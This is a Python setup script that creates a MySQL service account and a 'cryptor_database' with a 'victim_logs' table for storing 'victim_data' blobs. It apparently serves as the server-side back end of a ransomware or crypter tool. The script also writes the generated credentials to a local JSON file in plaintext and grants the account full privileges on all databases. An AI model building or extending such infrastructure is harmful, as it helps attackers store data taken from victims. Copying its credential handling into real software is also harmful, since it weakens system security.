#!/usr/bin/env python3
import os
import mysql
import mysql.connector
from os.path import exists
import random
import string
import json

def LogPrompt(st):
    print ("\t"+os.path.basename(__file__)+">>\t"+st);


if (not exists( "./MySQLSVCCredentials.json")):
    os.system("stty -echo")
    password = input("In order for the server to work properly a MySQL service account must be created.\nIf you do not currently have MySQL installed, Please install MySQL so that the proper configurations can be made.\nThe credentials for a new service account will be stored locally.\n\nPlease Enter MySQL Database 'root' password: ")
    os.system("stty echo")
    print('')

    try:
        conn = mysql.connector.connect(user='root', password=password, host='localhost')
        if conn:
            LogPrompt("Connected to mysql database")
        else:
            exit()
        Credentials = {}
        Credentials['user'] = "MySQLUserSVC"
        Credentials['password'] = ''.join(random.choice(string.ascii_lowercase +  string.ascii_uppercase + string.digits ) for i in range (32))
        with open ("./MySQLSVCCredentials.json","w+") as CredentialFile:
            CredentialFile.write(str(json.dumps(Credentials)))
        Cursor = conn.cursor()
        # print("here\n")
        CreateServiceAcc = "CREATE USER '%s'@'localhost' IDENTIFIED BY '%s';"%( Credentials['user'],  Credentials['password'])
        UserPermissions = "GRANT ALL PRIVILEGES ON *.* TO '%s'@'localhost';"%( Credentials['user'] )
        Cursor.execute(CreateServiceAcc)
        Cursor.execute(UserPermissions)
        Cursor.execute("FLUSH PRIVILEGES;")
        LogPrompt("MySQL Service account created")
        LogPrompt("Attempting to create the cryptor_database!")
        Cursor.execute("CREATE DATABASE IF NOT EXISTS cryptor_database")
        LogPrompt("Connecting to cryptor_database")
        Cursor.execute("USE cryptor_database")
        LogPrompt("Creating victim_logs")
        Cursor.execute("CREATE TABLE IF NOT EXISTS victim_logs("
                + "ID INT PRIMARY KEY AUTO_INCREMENT, "
                + "ConnectionName VARCHAR (20) NOT NULL,"
                + "victim_data BLOB NOT NULL)") 
        LogPrompt("MySQL Configured")
        
    except Exception as e:
        print (e)
        exit()
else:
    LogPrompt("MySQL Service Account Previously Configured!")
